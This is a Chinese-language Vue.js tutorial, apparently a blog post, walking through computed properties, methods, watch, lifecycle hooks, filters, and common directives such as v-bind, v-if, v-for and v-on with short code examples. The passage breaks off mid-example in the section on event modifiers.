<p>姓名的姓氏和名字互相组合替换功能<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">    data :&#123;</div><div class="line">        firstName : <span class="string">'jack'</span>,</div><div class="line">        lastName : <span class="string">'Green'</span></div><div class="line">    &#125;,</div><div class="line">    computed:&#123; <span class="comment">//默认就是getter的情况</span></div><div class="line">        fullName : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; </div><div class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.firstName + <span class="string">' '</span> + <span class="keyword">this</span>.lastName;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    computed:&#123; <span class="comment">//两者都有的情况</span></div><div class="line">        fullName : &#123;</div><div class="line">            get: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; </div><div class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.firstName + <span class="string">' '</span> + <span class="keyword">this</span>.lastName;</div><div class="line">            &#125;,</div><div class="line">            set: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">                <span class="keyword">var</span> names = newValue.split(<span class="string">' '</span>);</div><div class="line">                <span class="keyword">this</span>.firstName = names[<span class="number">0</span>];</div><div class="line">                <span class="keyword">this</span>.lastName = names[names.length - <span class="number">1</span>];</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
<h3 id="显示数据"><a href="#显示数据" class="headerlink" title="显示数据"></a>显示数据</h3><p>Vue会根据双括号来动态替换数据<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>&#123;&#123;filename&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">javascript</span>&gt;</span></div><div class="line">var app = new Vue(&#123;</div><div class="line">    data: &#123;</div><div class="line">        filename: 'file'</div><div class="line">    &#125;</div><div class="line">&#125;)</div><div class="line"><span class="tag">&lt;/<span class="name">javascript</span>&gt;</span></div></pre></td></tr></table></figure></p>
<h2 id="事件-监听"><a href="#事件-监听" class="headerlink" title="事件/监听"></a>事件/监听</h2><h3 id="事件-methods"><a href="#事件-methods" class="headerlink" title="事件 methods"></a>事件 methods</h3><p><code>methods</code>自定义触发函数<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> vm = <span class="keyword">new</span> Vue(&#123;</div><div class="line">  data: &#123; <span class="attr">a</span>: <span class="number">1</span> &#125;,</div><div class="line">  methods: &#123;</div><div class="line">    plus: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">      <span class="keyword">this</span>.a++</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;)</div><div class="line">vm.plus()</div><div class="line">vm.a <span class="comment">// 2</span></div></pre></td></tr></table></figure></p>
<p>结合<code>v-on</code>指令可以构成事件。</p>
<h3 id="监听-watch"><a href="#监听-watch" class="headerlink" title="监听 watch"></a>监听 watch</h3><p>　　watch选项用来监听某个prop或data的改变，当他们发生变化时，就会触发watch配置的函数。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">watch:&#123;</div><div class="line">    <span class="comment">//监听Value变量</span></div><div class="line">    Value: <span class="function"><span class="keyword">function</span> (<span class="params">val</span>)</span>&#123;</div><div class="line">        <span class="keyword">this</span>.currentValue = val; <span class="comment">//使用父组件的v-model改变值</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="生命周期钩子"><a href="#生命周期钩子" class="headerlink" title="生命周期钩子"></a>生命周期钩子</h2><p>生命周期钩子，就是在页面渲染到不同的阶段，执行自定义的操作。列出所有，选一个常用的mounted说明：</p>
<ul>
<li>beforeCreate</li>
<li>created</li>
<li>beforeMount</li>
<li>mounted</li>
<li>beforeUpdate</li>
<li>updated</li>
<li>activated</li>
<li>deactivated</li>
<li>beforeDestroy</li>
<li>destroyed</li>
<li>errorCaptured</li>
</ul>
<h3 id="生命周期图例"><a href="#生命周期图例" class="headerlink" title="生命周期图例"></a>生命周期图例</h3><p>以下说明各个生命周期钩子的位置，以及已经执行了什么。<br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fthm8iszxuj30xc2cft9s.jpg" alt="生命周期图例"></p>
<h3 id="mounted"><a href="#mounted" class="headerlink" title="mounted"></a>mounted</h3><p>　　当挂载完成后，调用该钩子.注意 <code>mounted</code> 不会承诺所有的子组件也都一起被挂载。如果你希望等到整个视图都渲染完毕，可以用 <code>vm.$nextTick</code> 替换掉 <code>mounted</code><br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mounted: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">this</span>.$nextTick(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="comment">// Code that will run only after the</span></div><div class="line">    <span class="comment">// entire view has been rendered</span></div><div class="line">  &#125;)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="过滤器-filters"><a href="#过滤器-filters" class="headerlink" title="过滤器 filters"></a>过滤器 filters</h2><p>　　过滤器可以用在两个地方：<strong>双花括号插值</strong> 和 <strong>v-bind 表达式</strong><br>　　过滤器应该被添加在 JavaScript 表达式的尾部，由“管道”符号指示：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- 在双花括号中 --&gt;</span></div><div class="line">&#123;&#123; message | capitalize &#125;&#125;</div><div class="line"></div><div class="line"><span class="comment">&lt;!-- 在 `v-bind` 中 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-bind:id</span>=<span class="string">"rawId | formatId"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!-- 过滤器可以串联 --&gt;</span></div><div class="line">&#123;&#123; message | filterA | filterB &#125;&#125;</div><div class="line"><span class="comment">&lt;!-- 过滤器可以接受参数 参数1：message 参数二：arg1 参数三：arg2 --&gt;</span></div><div class="line">&#123;&#123; message | filterA('arg1', arg2) &#125;&#125;</div></pre></td></tr></table></figure></p>
<h3 id="自定义过滤器"><a href="#自定义过滤器" class="headerlink" title="自定义过滤器"></a>自定义过滤器</h3><p>　　在一个组件的选项中定义本地的过滤器：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">filters: &#123;</div><div class="line">  capitalize: <span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span> (!value) <span class="keyword">return</span> <span class="string">''</span></div><div class="line">    value = value.toString()</div><div class="line">    <span class="keyword">return</span> value.charAt(<span class="number">0</span>).toUpperCase() + value.slice(<span class="number">1</span>)</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>　　或全局定义过滤器<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Vue.filter(<span class="string">'capitalize'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span> (!value) <span class="keyword">return</span> <span class="string">''</span></div><div class="line">  value = value.toString()</div><div class="line">  <span class="keyword">return</span> value.charAt(<span class="number">0</span>).toUpperCase() + value.slice(<span class="number">1</span>)</div><div class="line">&#125;)</div></pre></td></tr></table></figure></p>
<h2 id="组件-components"><a href="#组件-components" class="headerlink" title="组件 components"></a>组件 components</h2><p>　　使用<code>components</code>可以用<code>Vue.component</code>定义一个新的组件，也可以在父组件内定义（如同其他选项一样）。<br>　　具体在组件篇中说明</p>
<hr>

<h1 id="指令"><a href="#指令" class="headerlink" title="指令"></a>指令</h1><p><a href="https://cn.vuejs.org/v2/api/#%E6%8C%87%E4%BB%A4" target="_blank" rel="external">Vue指令</a>有很多,说明常用指令</p>
<h2 id="v-cloak"><a href="#v-cloak" class="headerlink" title="v-cloak"></a>v-cloak</h2><p>　　当在简单的项目中，js还没有加载完时，页面会显示一些未渲染完的东西比如<code>｛｛name｝｝</code>，在加载完后会闪动页面刷新显示。而在工程化项目里，因为HTML结构只有一个空的div元素，所以不会有闪动情况。<br>　　<strong>v-cloak</strong>就是用于vue.js还未加载完时，隐藏vue的html部分。</p>
<ul>
<li>不需要表达式</li>
<li>通常与css一起使用。</li>
</ul>
<p>html页面<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;div id=<span class="string">'app'</span> v-cloak&gt;</div><div class="line">&lt;<span class="regexp">/div&gt;</span></div></pre></td></tr></table></figure></p>
<p>css页面<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-attr">[v-cloak]</span> &#123;</div><div class="line">    <span class="attribute">diaplay</span>: none</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h2 id="v-once"><a href="#v-once" class="headerlink" title="v-once"></a>v-once</h2><p>　　<strong>v-once</strong>：定义他的元素或组件只渲染一次，包括元素或者组件的所有子节点。首次渲染后，不再跟随数据的变化重新渲染，将被视为静态内容。</p>
<h2 id="v-bind-修改属性"><a href="#v-bind-修改属性" class="headerlink" title="v-bind 修改属性"></a>v-bind 修改属性</h2><p><code>v-bind</code>:可以动态修改标签的属性<br>下面说细节的使用方式</p>
<h3 id="字符串语法"><a href="#字符串语法" class="headerlink" title="字符串语法"></a>字符串语法</h3><p>字符串语法可以动态调用变量<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//直接使用，用data中的url动态更新href属性</span></div><div class="line">&lt;a v-bind:href=<span class="string">"url"</span>&gt;链接&lt;<span class="regexp">/a&gt;</span></div><div class="line"><span class="regexp">...</span></div><div class="line"><span class="regexp">    data: &#123;</span></div><div class="line"><span class="regexp">        url: "http:/</span><span class="regexp">/www.abc.com"</span></div><div class="line"><span class="regexp">    &#125;</span></div></pre></td></tr></table></figure></p>
<p>字符串语法可以调用methods函数，动态调整参数<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//</span></div><div class="line">&lt;a v-bind:href=<span class="string">"geturl(this.param)"</span>&gt;链接&lt;<span class="regexp">/a&gt;</span></div><div class="line"><span class="regexp">...</span></div><div class="line"><span class="regexp">    data：&#123;</span></div><div class="line"><span class="regexp">        param: "123"</span></div><div class="line"><span class="regexp">    &#125;</span></div><div class="line"><span class="regexp">    methods: &#123;</span></div><div class="line"><span class="regexp">        geturl : function()&#123;</span></div><div class="line"><span class="regexp">            return "http:/</span><span class="regexp">/"+param;</span></div><div class="line"><span class="regexp">        &#125;</span></div><div class="line"><span class="regexp">    &#125;</span></div></pre></td></tr></table></figure></p>
<h3 id="对象语法"><a href="#对象语法" class="headerlink" title="对象语法"></a>对象语法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//使用语法糖(省略写法)，根据data中的布尔型isActive，来判断是否显示字符串active</span></div><div class="line">&lt;div :<span class="class"><span class="keyword">class</span></span>=<span class="string">"&#123; 'active': isActive , 'error': isError &#125;"</span>&gt; <span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></div><div class="line">...</div><div class="line">    data: &#123;</div><div class="line">        isActive: <span class="literal">true</span>,</div><div class="line">        isError: <span class="literal">false</span></div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<h3 id="数组语法"><a href="#数组语法" class="headerlink" title="数组语法"></a>数组语法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//使用语法糖，根据data中的对象值，来填入class</span></div><div class="line">&lt;div :<span class="class"><span class="keyword">class</span></span>=<span class="string">"[ activeCls , errorCls ]"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></div><div class="line">...</div><div class="line">    data: &#123;</div><div class="line">        activeCls : <span class="string">'actice'</span>,</div><div class="line">        errorCls : <span class="string">'error'</span></div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<h3 id="数组语法-对象语法"><a href="#数组语法-对象语法" class="headerlink" title="数组语法 + 对象语法"></a>数组语法 + 对象语法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//使用语法糖，isActive为正时，显示active</span></div><div class="line">&lt;div :<span class="class"><span class="keyword">class</span></span>=<span class="string">"[ &#123; 'active': isActive &#125;, errorCls ]"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></div><div class="line">...</div><div class="line">    data: &#123;</div><div class="line">        isActive: <span class="literal">true</span>,</div><div class="line">        errorCls : <span class="string">'error'</span></div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>　　不过可用变量也不一定是<code>data</code>下的数据，在<code>computed选项</code>,或者在语句中产生的变量也可以使用</p>
<h2 id="v-if-v-else-if-v-else"><a href="#v-if-v-else-if-v-else" class="headerlink" title="v-if 　v-else-if　 v-else"></a>v-if 　v-else-if　 v-else</h2><p>　　条件渲染指令<br>　　<code>v-else-if</code>要紧跟<code>v-if</code>,<code>v-else</code>要紧跟<code>v-else-if</code>或<code>v-if</code>。表达式的值为真时，当前元素/组件及<strong>所有子节点</strong>将被渲染，为假时被移除。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-if</span>=<span class="string">"type === 'A'"</span>&gt;</span></div><div class="line">  A</div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else-if</span>=<span class="string">"type === 'B'"</span>&gt;</span></div><div class="line">  B</div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else-if</span>=<span class="string">"type === 'C'"</span>&gt;</span></div><div class="line">  C</div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-else</span>&gt;</span></div><div class="line">  Not A/B/C</div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure></p>
<h3 id="template-多元素渲染"><a href="#template-多元素渲染" class="headerlink" title="template 多元素渲染"></a>template 多元素渲染</h3><p>　　如果以此判断的是<strong>多个元素</strong>，可以在Vue.js内置的<code>&lt;template&gt;</code>元素上使用条件指令，最终渲染的结果不会包括该元素<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-if</span>=<span class="string">"status === 1"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>test 1<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>test 2<span class="tag">&lt;/<span class="name">p</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript">    <span class="keyword">var</span> app = <span class="keyword">new</span> Vue(&#123;</span></div><div class="line"><span class="javascript">        el: <span class="string">'#app'</span>,</span></div><div class="line"><span class="undefined">        data: &#123;</span></div><div class="line"><span class="undefined">            status: 1</span></div><div class="line"><span class="undefined">        &#125;</span></div><div class="line"><span class="undefined">    &#125;)</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
<h2 id="v-show"><a href="#v-show" class="headerlink" title="v-show"></a>v-show</h2><p>　　根据表达式之真假值，切换元素的<code>display</code>CSS属性。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-show</span>=<span class="string">"status === 1"</span>&gt;</span>Hello!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></div></pre></td></tr></table></figure></p>
<blockquote>
<p>v-show 不支持 <code>&lt;template&gt;</code> 元素，也不支持 <code>v-else</code><br><code>v-show</code> 不管初始条件是什么，元素总是会被渲染，并且只是简单地基于 CSS 进行切换。</p>
</blockquote>
<h2 id="v-for"><a href="#v-for" class="headerlink" title="v-for"></a>v-for</h2><p>　　数组、对象遍历显示时会用到<code>v-for</code>，他的表达式需结合<code>in</code>,利用<code>item in items</code>的形式来使用。<code>items</code>是源数据数组并且<code>item</code>是数组元素迭代的别名。</p>
<h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- 数组，值 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">"item in items"</span>&gt;</span></div><div class="line">  &#123;&#123; item.text &#125;&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="comment">&lt;!-- 数组，值+索引 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">"(item,index) in items"</span>&gt;</span></div><div class="line">  &#123;&#123; item.text &#125;&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
<h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- 对象,值 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">"value in object"</span>&gt;</span></div><div class="line">  &#123;&#123; value &#125;&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="comment">&lt;!-- 对象，值+键名 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">"(value, key) in object"</span>&gt;</span></div><div class="line">  &#123;&#123; key &#125;&#125;: &#123;&#123; value &#125;&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"><span class="comment">&lt;!-- 对象，值+键名+索引 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-for</span>=<span class="string">"(value, key, index) in object"</span>&gt;</span></div><div class="line">  &#123;&#123; index &#125;&#125;. &#123;&#123; key &#125;&#125;: &#123;&#123; value &#125;&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
<h3 id="template-多元素渲染-1"><a href="#template-多元素渲染-1" class="headerlink" title="template 多元素渲染"></a>template 多元素渲染</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-for</span>=<span class="string">"book in books"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>书名：&#123;&#123;book.name&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>作者：&#123;&#123;book.name&#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></div></pre></td></tr></table></figure>
<h3 id="数组更新"><a href="#数组更新" class="headerlink" title="数组更新"></a>数组更新</h3><p>改变数组会触发视图更新</p>
<ul>
<li>push()</li>
<li>pop()</li>
<li>shift()</li>
<li>unshift()</li>
<li>splice():</li>
<li>sort()</li>
<li>reverse()</li>
</ul>
<p>返回新数组，不会触发视图更新</p>
<ul>
<li>filter()</li>
<li>concat()</li>
<li>slice()</li>
</ul>
<p>不会触发视图更新的：</p>
<ul>
<li>通过索引直接设置项 <code>app.books[3]={}</code></li>
<li>修改数组长度 <code>app.books.length=1</code></li>
</ul>
<p>第一个问题可以使用<code>Vue.ser</code>和<code>$set</code>来实现<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">Vue.set(app.books, <span class="number">3</span>, &#123;</div><div class="line">    name: <span class="string">'《CSS揭秘》'</span>,</div><div class="line">    author: <span class="string">'Lea Verou'</span></div><div class="line">&#125;);</div><div class="line"><span class="comment">//webpack中使用组件化，默认是没有导入Vue的，使用$set</span></div><div class="line"><span class="keyword">this</span>.$set(app.books, <span class="number">3</span>,&#123;</div><div class="line">    name: <span class="string">'《CSS揭秘》'</span>,</div><div class="line">    author: <span class="string">'Lea Verou'</span></div><div class="line">&#125;);</div></pre></td></tr></table></figure></p>
<p>第一个问题，第二个问题都可以使用<code>splice</code>来解决<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">app.books.splice(<span class="number">3</span>,<span class="number">1</span>,&#123;</div><div class="line">    name: <span class="string">'《CSS揭秘》'</span>,</div><div class="line">    author: <span class="string">'Lea Verou'</span></div><div class="line">&#125;);</div><div class="line"><span class="comment">//修改数组长度</span></div><div class="line">app.books.splice(<span class="number">1</span>);</div></pre></td></tr></table></figure></p>
<h2 id="v-on-事件监听器"><a href="#v-on-事件监听器" class="headerlink" title="v-on 事件监听器"></a>v-on 事件监听器</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//点击触发事件，执行js</span></div><div class="line">&lt;button v-on:click=<span class="string">"handleClose"</span>&gt;点击隐藏&lt;<span class="regexp">/button&gt;</span></div><div class="line"><span class="regexp">/</span><span class="regexp">/语法糖写法</span></div><div class="line"><span class="regexp">&lt;button @click="handleClose"&gt;点击隐藏&lt;/</span>button&gt;</div><div class="line">...</div><div class="line">    methods： &#123;</div><div class="line">        handleClose： <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            </div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
<p>原生事件列表：</p>
<ul>
<li>click</li>
<li>change</li>
</ul>
<blockquote>
<p>特殊参数$event:用于访问原生DOM事件，比如调用 event.stopPropagation()</p>
</blockquote>
<h3 id="事件修饰符"><a href="#事件修饰符" class="headerlink" title="事件修饰符"></a>事件修饰符</h3><p>　　在事件处理程序中调用<code>event.preventDefault()</code>或 <code>event.stopPropagation()</code>是非常常见的需求。尽管我们可以在方法中轻松实现这点，但更好的方式是：方法只有纯粹的数据逻辑，而不是去处理 DOM 事件细节。</p>
<ul>
<li><strong>stop</strong>：调用 event.stopPropagation()</li>
<li><strong>.prevent</strong>：调用 event.preventDefault()</li>
<li><strong>.capture</strong>：添加事件侦听器时使用 capture 模式</li>
<li><strong>.self</strong>：只当事件是从侦听器绑定的元素本身触发时才触发回调</li>
<li><strong>.once</strong>：只触发一次回调<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- 阻止单击事件继续传播 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">v-on:click.stop</span>=<span class="string">"doThis"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!-- 提交事件不再重载页面 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">v-on:submit.prevent</span>=<span class="string">"onSubmit"</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!-- 修饰符可以串联 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">v-on:click.stop.prevent</span>=<span class="string">"doThat"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!-- 只有修饰符 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">v-on:submit.prevent</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!-- 添加事件监听器时使用事件捕获模式 --&gt;</span></div><div class="line"><span class="comment">&lt;!-- 即元素自身触发的事件先在此处处理，然后才交由内部元素进行处理 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-on:click.capture</span>=<span class="string">"doThis"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line"></div><div class="line"><span class="comment">&lt;!-- 只当在 event.target 是当前元素自身时触发处理函数 --&gt;</span></div><div class="line"><span class="comment">&lt;!-- 即事件不是从内部元素触发的 --&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-on:click.self</span>=<span 